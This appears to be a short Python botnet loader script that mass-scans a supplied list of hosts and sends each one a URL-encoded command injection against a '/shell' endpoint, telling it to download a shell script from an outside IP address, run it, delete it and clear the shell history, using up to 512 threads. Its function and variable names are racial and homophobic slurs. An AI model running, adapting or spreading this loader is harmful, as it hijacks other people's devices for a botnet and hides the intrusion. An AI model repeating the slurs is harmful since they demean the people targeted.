import requests,threading,time,socket,sys,random
global running
running = 0
def nigger(x):
    global running
    running += 1
    try:
        requests.get("http://" + x + "/shell?cd%20%2Ftmp%3Brm%20-rf%20N1qq3r.sh%3Bwget%20http%3A%2F%2F45.14.224.197%2FN1qq3r.sh%3Bchmod%20%2Bx%20N1qq3r.sh%3B.%2FN1qq3r.sh%3Brm%20-rf%20N1qq3r.sh%3Bcd%3Bhistory%20-c%3B", timeout=10)
        print(x)
    except Exception as e:
        print str(e)
        pass
    running -= 1
urgay = open(sys.argv[1], "r").read().replace("\r", "").split("\n")
random.shuffle(urgay)
for x in urgay:
    if running >= 512:
        time.sleep(1)
    threading.Thread(target=nigger, args=(x,)).start()